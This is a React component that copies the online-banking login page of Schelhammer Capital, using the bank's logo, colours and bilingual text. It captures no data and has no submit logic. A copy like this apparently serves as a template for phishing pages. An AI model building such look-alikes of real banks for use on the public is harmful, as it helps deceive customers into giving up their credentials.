import { useState } from "react";
import { X } from "lucide-react";
import schelhammerLogo from "@/assets/schelhammer-logo.jpg";
import schelhammerBg from "@/assets/schelhammer-bg.png";

const Schelhammer = () => {
  const [username, setUsername] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [lang, setLang] = useState<"de" | "en">("de");

  return (
    <div className="min-h-screen flex flex-col">
      {/* Header */}
      <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0" }}>
        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-3">
          <img src={schelhammerLogo} alt="Schelhammer Capital 1832" className="h-10 md:h-14" />
        </div>
      </header>

      {/* Main */}
      <div
        className="flex-1 flex items-center justify-center px-4"
        style={{
          backgroundImage: `url(${schelhammerBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
        }}
      >
        <div className="w-full max-w-[560px] rounded overflow-hidden">
          {/* Red header bar */}
          <div
            className="px-6 py-4 text-white font-semibold text-xl"
            style={{ backgroundColor: "#d31220" }}
          >
            Login
          </div>

          {/* Card body */}
          <div className="bg-white px-6 py-5 space-y-4">
            {/* Info text */}
            <p className="text-base leading-snug" style={{ color: "#333" }}>
              {lang === "de"
                ? "Hier können Sie sich für Ihr neues Online Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!"
                : "You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN."}
            </p>

            {/* Demo text */}
            <p className="text-base leading-snug" style={{ color: "#333" }}>
              {lang === "de"
                ? "Möchten Sie sich die Demo-Version ansehen? In diesem Fall brauchen Sie keine Zugangsdaten anzugeben."
                : "Would you like to view the demo version? In this case, you do not need to enter any access data."}
            </p>

            {/* Divider */}
            <hr className="-mx-6 border-gray-200" />

            {/* Label row */}
            <div className="flex items-center justify-between">
              <span className="font-semibold text-xs" style={{ color: "#999" }}>
                {lang === "de" ? "Benutzername" : "Username"}
              </span>
              <span className="text-sm space-x-2">
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  style={{ color: "#333" }}
                >
                  {lang === "de" ? "Hochkontrast" : "High contrast"}
                </a>
                <span style={{ color: "#999" }}>|</span>
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault();
                    setLang(lang === "de" ? "en" : "de");
                  }}
                  style={{ color: "#d31220" }}
                >
                  {lang === "de" ? "English" : "Deutsch"}
                </a>
              </span>
            </div>

            {/* Username input */}
            <div className="relative">
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                onFocus={() => setIsFocused(true)}
                onBlur={() => setIsFocused(false)}
                className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors"
                style={{
                  backgroundColor: isFocused ? "#f5d5d8" : "#e8e8e8",
                  borderColor: isFocused ? "#d31220" : "#999",
                  boxShadow: isFocused ? "0 0 0 1px #d31220" : "none",
                }}
              />
              {username && (
                <button
                  onClick={() => setUsername("")}
                  className="absolute right-2 top-1/2 -translate-y-1/2"
                  type="button"
                >
                  <X size={24} color={isFocused ? "#d31220" : "#333"} />
                </button>
              )}
            </div>

            {/* First time login link */}
            <div className="text-center">
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-[15px] no-underline hover:underline"
                style={{ color: "#d31220" }}
              >
                {lang === "de" ? "Sie melden sich zum ersten Mal an?" : "First time logging in?"}
              </a>
            </div>

            {/* Terms text */}
            <p className="text-[15px] text-center" style={{ color: "#333" }}>
              {lang === "de"
                ? "Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu."
                : "By entering your access data, you expressly agree to the bank's terms of use."}
            </p>

            {/* Weiter button */}
            <button
              className="w-full py-3 text-white font-semibold rounded text-sm"
              style={{ backgroundColor: "#d31220" }}
            >
              {lang === "de" ? "Weiter" : "Continue"}
            </button>

            {/* Divider */}
            <hr className="-mx-6 border-gray-200" />

            {/* Links */}
            <div className="flex flex-col items-center" style={{ gap: 0 }}>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: "#d31220" }}
              >
                {lang === "de" ? "Benutzername vergessen?" : "Forgot username?"}
              </a>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: "#d31220" }}
              >
                {lang === "de" ? "Passwort vergessen?" : "Forgot password?"}
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Schelhammer;
